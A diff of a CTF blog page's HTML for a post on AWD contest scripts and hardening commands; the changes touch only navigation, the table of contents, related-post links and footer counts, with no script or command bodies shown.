@@ -329,7 +517,7 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
     <div class="item left">
       
 
-  <a href="/MiniLCTF_2020%E9%A2%98%E8%A7%A3/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;54235-BanG_Dream-HikawaHina-PC-Wallpaper.jpg" title="MiniLCTF_2020题解">
+  <a href="/MiniLCTF_2020%E9%A2%98%E8%A7%A3/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zephyr-cyber&#x2F;Blog-Gallery@main&#x2F;&#x2F;blog-img&#x2F;50380-IDOLY_PRIDE-PC-Wallpaper.jpg" title="MiniLCTF_2020题解">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> computer-science</span>
   <h3>MiniLCTF_2020题解</h3>
@@ -353,7 +541,7 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#awd%E7%BA%BF%E4%B8%8B%E8%B5%9B%E9%98%B2%E5%AE%88%E8%84%9A%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text"> AWD 线下赛防守脚本：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#awd%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text"> AWD 线下赛攻击脚本：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99"><span class="toc-number">3.</span> <span class="toc-text"> 备份网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text"> 查看已建立的网络连接以及对应进程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text"> 用户管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text"> 进程管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iptables%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text"> iptables 命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">8.</span> <span class="toc-text"> Mysql 数据库操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5"><span class="toc-number">9.</span> <span class="toc-text"> 安全检查</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD%E7%BA%BF%E4%B8%8B%E8%B5%9B%E9%98%B2%E5%AE%88%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">AWD线下赛防守脚本：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">AWD线下赛攻击脚本：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99"><span class="toc-number">3.</span> <span class="toc-text">备份网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">查看已建立的网络连接以及对应进程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">用户管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">进程管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iptables%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">iptables命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">8.</span> <span class="toc-text">Mysql数据库操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5"><span class="toc-number">9.</span> <span class="toc-text">安全检查</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">10.</span> <span class="toc-text">改密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7"><span class="toc-number">11.</span> <span class="toc-text">后门用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD"><span class="toc-number">12.</span> <span class="toc-text">备份</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B9php%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-number">13.</span> <span class="toc-text">改php数据库密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E9%98%B2"><span class="toc-number">14.</span> <span class="toc-text">通防</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%AB%AF%E5%8F%A3-%E7%A6%81%E7%94%A8"><span class="toc-number">15.</span> <span class="toc-text">查端口,禁用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BE%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.</span> <span class="toc-text">找简单漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%AB%AF%E5%8F%A3%E7%A6%81%E7%94%A8"><span class="toc-number">17.</span> <span class="toc-text">查端口禁用</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
         <ul>
@@ -487,9 +675,12 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/computer-science/Misc/" title="In Misc">Misc</a>
 </div>
 
-    <span><a href="/markdown/" title="Markdown Style test">Markdown Style test</a></span>
+    <span><a href="/computer-science/Misc/%E6%AF%94%E8%B5%9Bmisc/" title="比赛MISC">比赛MISC</a></span>
   </li>
 
       
@@ -520,21 +711,10 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/English/" title="In English">English</a>
 </div>
 
-    <span><a href="/long-title/" title="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam justo turpis, tincidunt ac convallis id.</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/computer-science/Pwn/" title="In Pwn">Pwn</a>
-</div>
-
-    <span><a href="/computer-science/Pwn/pwn2/" title="pwn2">pwn2</a></span>
+    <span><a href="/English/" title="Learn English">Learn English</a></span>
   </li>
 
       
@@ -543,7 +723,7 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/accumulate/" title="accumulate">accumulate</a></span>
+    <span><a href="/tags/" title="Tags">Tags</a></span>
   </li>
 
       
@@ -552,7 +732,7 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
 <div class="breadcrumb">
 </div>
 
-    <span><span class="exturl" data-url="aHR0cDovL3d3dy5nb29nbGUuY29tLw==" title="Link Post">Link Post<i class="ic i-link-alt"></i></span></span>
+    <span><a href="/images/" title="Images">Images</a></span>
   </li>
 
       
@@ -563,6 +743,16 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
 </div>
 
     <span><a href="/AWD/" title="AWD脚本和加固命令">AWD脚本和加固命令</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/computer-science/" title="In computer-science">computer-science</a>
+</div>
+
+    <span><a href="/moeCTF_2021%E9%A2%98%E8%A7%A3/" title="MoeCTF_2021题解">MoeCTF_2021题解</a></span>
   </li>
 
       
@@ -582,9 +772,11 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
     
 <div class="breadcrumb">
 <a href="/categories/computer-science/" title="In computer-science">computer-science</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/computer-science/Pwn/" title="In Pwn">Pwn</a>
 </div>
 
-    <span><a href="/moeCTF_2021%E9%A2%98%E8%A7%A3/" title="MoeCTF_2021题解">MoeCTF_2021题解</a></span>
+    <span><a href="/computer-science/Pwn/pwn2/" title="pwn2">pwn2</a></span>
   </li>
 
   </ul>
@@ -609,13 +801,13 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">120k words</span>
+    <span title="Symbols count total">122k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">1:49</span>
+    <span title="Reading time total">1:51</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">Canary</span> & Inspire.<span class="exturl" data-url="aHR0cHM6Ly96ZXBoeXItY3liZXIuZ2l0aHViLmlv">taotaotao!</span>
